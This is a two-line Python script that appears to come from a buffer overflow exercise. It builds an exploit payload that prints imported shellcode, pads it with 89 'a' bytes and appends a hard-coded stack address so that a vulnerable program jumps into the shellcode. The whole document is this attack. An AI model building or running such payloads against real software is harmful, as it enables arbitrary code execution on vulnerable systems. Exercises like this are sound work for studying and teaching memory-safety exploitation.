from shellcode import shellcode
print (shellcode+"a"*89+"\xbc\x9c\xfe\xbf")
